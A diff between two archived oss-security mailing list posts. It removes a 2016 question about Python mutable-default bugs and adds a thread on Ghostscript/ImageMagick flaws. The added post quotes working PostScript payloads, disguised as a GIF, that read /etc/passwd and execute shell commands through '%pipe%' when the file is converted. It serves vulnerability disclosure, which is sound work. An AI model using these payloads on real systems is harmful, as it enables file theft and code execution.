@@ -1,75 +1,100 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/06/8
-Message-ID: <2ECE9D9EEF1F524185270138AE232659550547C3@S0MSMAIL112.arc.local>
-Date: Tue, 6 Dec 2016 17:02:56 +0000
-From: Fiedler Roman <Roman.Fiedler@....ac.at>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: Opensource Python whitebox code analysis tool recommendations
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/9
+Message-ID: <8737kh14b8.fsf@mid.deneb.enyo.de>
+Date: Fri, 30 Sep 2016 23:11:07 +0200
+From: Florian Weimer <fw@...eb.enyo.de>
+To: Tavis Ormandy <taviso@...gle.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
-Hello list,
+* Tavis Ormandy:
 
-I just stubled over effects of following programming error due to unwanted 
-singleton in Python, bypassing intended process restrictions (allowed number 
-of elements in my case) and of course data corruption:
+> On Thu, Sep 29, 2016 at 2:28 PM, Tavis Ormandy <taviso@...gle.com> wrote:
+>>
+>> Just for future reference, here is an example of dumping a file to an
+>> image processed with ImageMagick that works with gs 9.20:
+>>
+>> $ cat test.gif
+>> %!PS
+>> /Size 20 def                             % font/line size
+>> /Line 0 def                              % current line
+>> /Buf 1024 string def                     % line buffer
+>> /Path 0 newpath def
+>>
+>> /Courier-Bold findfont Size scalefont setfont
+>> 1 1 1 setrgbcolor clippath fill          % draw white background
+>> 0 0 0 setrgbcolor                        % set black foreground
+>>
+>> (/etc/passwd) .libfile {
+>>     {
+>>         dup Buf readline
+>>         {
+>>             Path Line moveto show
+>>         }{
+>>             showpage
+>>             quit
+>>         } ifelse
+>>         % next line
+>>         /Line Line Size add def
+>>     } loop
+>> } if
+>> $ convert test.gif png:test.png
+>
+> The more I look, the worse it gets. This also works in 9.18 and
+> higher, arbitrary shell command execution:
+>
+> $ cat test.gif
+> currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
+> .putdeviceparams
+> quit
+> $ convert test.gif png:test.png
+>
+> (Note: I don't know why it doesn't work on earlier versions, maybe
+> it's possible to make it work, or some other param will work)
 
-class A:
-  def __init__(self, value=[]):
-    self.value=value
-    self.valueCloned=value[:]
-  def show(self):
-    print 'IDs value %x, cloned %x' % (id(self.value), id(self.valueCloned))
-  def append(self, data):
-    self.value.append(data)
+It still tries to open a file in earlier versions, with directory
+traversal:
 
-# Keep reference to avoid garbage collection interference.
-objFirst=A()
-objFirst.show()
-objNext=A()
-objNext.show()
-# Check references to prohibit optimization.
-if objFirst==objNext: raise Exception('Impossible')
+[pid 29607] open("/usr/share/ghostscript/9.06/iccprofiles/../../../../../etc/passwd", O_RDONLY) = 5
+
+The %pipe%-based execution was introduced as a side effect of:
+
+commit 1fae53a708fca6c2ac0417bc23f5d095cc379250
+Author: Chris Liddell <chris.liddell@...ifex.com>
+Date:   Thu Jul 30 17:27:23 2015 +0100
+
+    Bug 696101: fix uses of the sfopen API.
+    
+    The stream API in GS is defined as *always* opening files in
+    binary mode, where applicable, so there is no need for the API
+    clients to specify binary mode.
+    
+    This is previously been benign, and thus ignored, but reportedly
+    ending up with a duplicate 'b' character in the mode causes a
+    crash on Windows 10.
+    
+    No cluster differences.
 
 
+It was not visible before because 'b' in the mode argument to popen
+causes glibc's popen to fail.  This is highly non-portable.  Earlier
+versions on different libcs are likely have to code execution, too.
 
-As this type of error seems to be more common in code, at least according to 
-grep, are there tool recommendations to do automatic analysis of code?
+> I think -dSAFER is too dangerous to use without sandboxing right now,
+> things like evince and imagemagick that use it as a backend should
+> disable by default.
 
-It should trace all non-trivial (not None, int, float, str, ...) constructor 
-arguments assignments and catch at least problematic invocations like 
-"self.value.append". A problem is, that in many cases just existence of 
-constructor like the one before does not automatically lead to 
-corruption/concurrency issues. For example the tool should not trigger on this 
-(older but still in use) version of django_common/http.py or at least, when 
-triggering, only at "json.dumps()".
+Note that this RCE-ish for things like CUPS and with mail clients
+which use mailcap entries which map file extensions to some
+Imagemagick tool (which ignore the file extension and fingerprint the
+input as a Postscript file to be handed off to Ghostscript).
 
-class JsonResponse(HttpResponse):
-  def __init__(self, data={ }, errors=[ ], success=True):
-    """
-    data is a map, errors a list
-    """
-    json = json_response(data=data, errors=errors, success=success)
-    super(JsonResponse, self).__init__(json, content_type='application/json')
+I reported your new vulnerability here:
 
-def json_response(data={ }, errors=[ ], success=True):
-  data.update({
-    'errors': errors,
-    'success': len(errors) == 0 and success,
-  })
-  return json.dumps(data)
+  http://bugs.ghostscript.com/show_bug.cgi?id=697178
 
-Due to weak typing, it might be too hard to catch all problematic locations, 
-e.g. field modified in subclass. Without source code analysis tools available 
-to do such checks, I would also try out any approaches where the argument 
-value is made immutable thus leading to crash in testbed.
-
-It would be great, if the tool would do the whole analysis more from the 
-security than code quality perspective: it is more interesting to audit own 
-code and referenced/redistributed third party stuff for things that "are very 
-likely to be problematic/vulnerable" than have a quality tool recommending to 
-change all those lines, which is not quite realistic.
-
-Kind regards,
-Roman
-
-Download attachment "smime.p7s" of type "application/pkcs7-signature" (6372 bytes)
+It's been a long time I looked at Ghostscript, but if I recall
+correctly, it's implemented in part in Postscript, which probably
+explains why there are super-privileged Postscript primitives which
+break the sandbox.
